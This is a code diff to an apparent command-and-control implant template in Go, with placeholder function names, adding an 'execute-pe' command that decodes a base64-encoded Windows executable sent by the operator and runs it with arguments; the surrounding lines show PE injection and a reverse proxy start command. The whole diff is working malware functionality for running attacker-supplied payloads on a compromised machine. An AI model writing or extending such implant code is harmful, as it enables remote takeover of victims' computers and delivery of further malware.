@@ -57,6 +57,32 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) strin
         }
         result := a.{AGENT_INJECT_PE_FUNC}(peData)
         return result
+    } else if strings.HasPrefix(command, "execute-pe ") {
+        // Handle execute PE command - base64 content follows directly after "execute-pe "
+        remainingCommand := command[11:] // Remove "execute-pe " prefix
+
+        // Check if there are arguments after the PE data
+        parts := strings.SplitN(remainingCommand, " ", 2)
+        encodedPE := parts[0]
+
+        var args []string
+        if len(parts) > 1 {
+            // Arguments are provided - split them by space
+            args = strings.Split(parts[1], " ")
+        } else {
+            args = []string{}
+        }
+
+        peData, err := base64.StdEncoding.DecodeString(encodedPE)
+        if err != nil {
+            return fmt.Sprintf("[ERROR] Invalid PE data format: %v", err)
+        }
+
+        result, err := a.{AGENT_EXECUTE_PE_FUNC}(peData, args)
+        if err != nil {
+            return fmt.Sprintf("[ERROR] Failed to execute PE: %v", err)
+        }
+        return result
     } else if command == "reverse_proxy_start" {
         go a.{AGENT_START_REVERSE_PROXY_FUNC}()
         return "[+] Reverse proxy started."
